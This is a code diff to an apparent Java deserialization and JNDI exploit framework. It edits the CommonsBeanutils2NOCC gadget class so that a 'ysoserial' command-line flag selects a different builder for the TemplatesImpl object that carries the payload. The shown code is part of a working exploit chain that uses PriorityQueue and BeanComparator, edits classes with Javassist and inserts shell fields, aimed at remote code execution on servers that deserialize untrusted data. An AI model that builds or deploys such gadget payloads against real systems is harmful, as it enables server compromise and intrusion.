@@ -3,6 +3,7 @@ package com.qi4l.jndi.gadgets;
 import com.qi4l.jndi.enumtypes.PayloadType;
 import com.qi4l.jndi.gadgets.annotation.Dependencies;
 import com.qi4l.jndi.gadgets.utils.Gadgets;
+import com.qi4l.jndi.gadgets.utils.GadgetsYso;
 import com.qi4l.jndi.gadgets.utils.SuClassLoader;
 import com.qi4l.jndi.gadgets.utils.Reflections;
 import javassist.ClassClassPath;
@@ -12,6 +13,7 @@ import javassist.CtClass;
 import java.util.Comparator;
 import java.util.PriorityQueue;
 
+import static com.qi4l.jndi.Starter.cmdLine;
 import static com.qi4l.jndi.gadgets.utils.InjShell.insertField;
 
 @SuppressWarnings({"rawtypes", "unchecked"})
@@ -20,7 +22,12 @@ public class CommonsBeanutils2NOCC implements ObjectPayload<Object> {
 
     public Object getObject(PayloadType type, String... param) throws Exception {
 
-        final Object templates = Gadgets.createTemplatesImpl(type, param);
+        final Object templates;
+        if (!cmdLine.getOptionValue("ysoserial").isEmpty() && cmdLine.getOptionValue("ysoserial").equals("1")) {
+            templates = GadgetsYso.createTemplatesImpl(param[0]);
+        } else {
+            templates = Gadgets.createTemplatesImpl(type, param);
+        }
         // 修改BeanComparator类的serialVersionUID
         ClassPool pool = ClassPool.getDefault();
         pool.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
